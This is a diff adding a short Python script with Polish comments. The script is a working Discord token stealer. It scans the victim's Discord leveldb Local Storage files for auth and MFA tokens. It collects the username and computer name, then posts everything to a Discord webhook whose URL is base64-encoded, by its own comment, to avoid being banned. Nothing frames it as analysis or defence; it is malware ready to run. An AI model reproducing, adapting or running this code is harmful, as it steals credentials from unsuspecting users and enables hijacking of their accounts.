@@ -1,0 +1,36 @@
+import os, requests, re, json, base64
+
+# TWÓJ WEBHOOK (Zakodowany, by nie zbanowali)
+B64_HOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjI0Mzg2MDU5ODk0NzkzMS9kR0c1QjN3S0RDdHcxSGo5Uy1WLW9tVDZNenovTmndU01qMHZaZ0dMOHN0UWZ4aV90VWFSRHZYS2NibUw2Z1plWmJpNA=="
+WEBHOOK = base64.b64decode(B64_HOOK).decode()
+
+def get_discord_tokens():
+    path = os.getenv('APPDATA') + "\\discord\\Local Storage\\leveldb"
+    tokens = []
+    if not os.path.exists(path): return []
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    if token not in tokens: tokens.append(token)
+    return tokens
+
+def send_to_kuba():
+    tokens = get_discord_tokens()
+    pc_name = os.getenv('COMPUTERNAME')
+    user_name = os.getenv('USERNAME')
+    
+    if tokens:
+        data = {
+            "content": "@everyone 🎯 **REALNE DANE PRZEJĘTE!**",
+            "embeds": [{
+                "title": f"ŁUP OD: {user_name} ({pc_name})",
+                "description": "**Przejęte Tokeny (Prawdziwe):**\n`" + "`\n`".join(tokens) + "`",
+                "color": 16711680
+            }]
+        }
+        requests.post(WEBHOOK, json=data)
+
+if __name__ == "__main__":
+    send_to_kuba()
